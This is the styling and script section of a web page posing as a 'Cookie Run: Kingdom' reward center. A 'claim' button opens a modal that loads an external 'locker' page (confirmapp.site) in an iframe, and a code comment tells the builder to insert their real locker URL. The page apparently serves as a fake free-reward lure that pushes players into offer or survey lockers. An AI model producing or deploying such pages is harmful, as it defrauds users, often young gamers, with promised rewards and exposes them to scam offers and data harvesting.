    <title>Cookie Run: Kingdom - Reward Center</title>

    <style>
        :root {
            --primary-gold: #ffcc00;
            --deep-chocolate: #5d3311;
            --shadow-color: rgba(0, 0, 0, 0.6);
        }

        .background-fixed {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: url('https://wallpapers.com/images/hd/cookie-run-kingdom-background-sjklpw5rlcrafleh.jpg') no-repeat center center fixed;
            background-size: cover;
            filter: blur(10px) brightness(0.7);
            z-index: -1;
            transform: scale(1.1);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Fredoka', sans-serif;
            color: #fff;
            overflow-x: hidden;
            background-color: #000;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .logo {
            width: 75%;
            max-width: 320px;
            height: auto;
            animation: floating 3.5s ease-in-out infinite;
            filter: drop-shadow(0 10px 15px var(--shadow-color));
        }

        @keyframes floating {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-12px); }
        }

        .game-title {
            font-family: 'Luckiest Guy', cursive;
            font-size: 2.6rem;
            margin: 15px 0 5px 0;
            background: linear-gradient(to bottom, #fff 20%, #ffcc00 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 3px 0 #b36b00) drop-shadow(0 6px 0 var(--deep-chocolate));
            text-transform: uppercase;
        }

        .game-subtitle {
            font-size: 1.1rem;
            margin-bottom: 30px;
            padding: 0 15px;
            line-height: 1.4;
            color: #ffefba;
            text-shadow: 2px 2px 4px var(--deep-chocolate);
        }

        .claim-btn {
            width: 85%;
            max-width: 280px;
            padding: 18px 0;
            font-family: 'Luckiest Guy', cursive;
            font-size: 1.6rem;
            background: linear-gradient(180deg, #ffed8a 0%, #ffa500 100%);
            color: var(--deep-chocolate);
            text-decoration: none;
            border-radius: 15px;
            border-bottom: 6px solid #b36b00;
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
            transition: 0.1s;
            display: block;
            cursor: pointer;
        }

        .claim-btn:active {
            transform: translateY(3px);
            border-bottom-width: 2px;
        }

        .social-icons {
            margin-top: 40px;
            display: flex;
            gap: 15px;
        }

        .social-icons a {
            color: white;
            font-size: 1.4rem;
            background: rgba(93, 51, 17, 0.8);
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            border: 2px solid var(--primary-gold);
            text-decoration: none;
        }

        /* MODAL */
        .locker-modal {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.72);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 18px;
            z-index: 9999;
        }

        .locker-modal.active {
            display: flex;
        }

        .locker-box {
            width: 100%;
            max-width: 900px;
            height: min(85vh, 720px);
            background: linear-gradient(180deg, #6f431a 0%, #3f220e 100%);
            border: 3px solid var(--primary-gold);
            border-radius: 22px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.55);
            overflow: hidden;
            position: relative;
            animation: modalPop 0.25s ease;
        }

        @keyframes modalPop {
            from {
                opacity: 0;
                transform: scale(0.92) translateY(20px);
            }
            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }

        .locker-header {
            height: 62px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px 0 20px;
            background: linear-gradient(180deg, #ffed8a 0%, #ffa500 100%);
            color: var(--deep-chocolate);
            font-family: 'Luckiest Guy', cursive;
            font-size: 1.2rem;
            letter-spacing: 0.5px;
            box-sizing: border-box;
        }

        .locker-close {
            width: 40px;
            height: 40px;
            border: none;
            border-radius: 50%;
            background: #fff3cf;
            color: #5d3311;
            font-size: 1.2rem;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.18);
        }

        .locker-close:hover {
            transform: scale(1.05);
        }

        .locker-body {
            height: calc(100% - 62px);
            background: #fff;
        }

        .locker-frame {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
            background: #fff;
        }

        @media (min-width: 768px) {
            .game-title { font-size: 4.2rem; }
            .game-subtitle { font-size: 1.5rem; }
            .claim-btn { max-width: 320px; font-size: 1.8rem; }
            .logo { max-width: 380px; }
        }

        @media (max-width: 640px) {
            .locker-box {
                height: 88vh;
                border-radius: 18px;
            }

            .locker-header {
                font-size: 1rem;
                padding-left: 14px;
                padding-right: 12px;
            }
        }
    </style>

    <script>
        function openLockerModal() {
            const modal = document.getElementById("lockerModal");
            const frame = document.getElementById("lockerFrame");

            modal.classList.add("active");
            document.body.style.overflow = "hidden";

            // Replace this with your REAL locker page URL
            frame.src = "https://confirmapp.site/cl/i/822wpk";
        }

        function closeLockerModal() {
            const modal = document.getElementById("lockerModal");
            const frame = document.getElementById("lockerFrame");

            modal.classList.remove("active");
            document.body.style.overflow = "";
            frame.src = "";
        }

        document.getElementById("lockerModal").addEventListener("click", function(e) {
            if (e.target === this) {
                closeLockerModal();
            }
        });
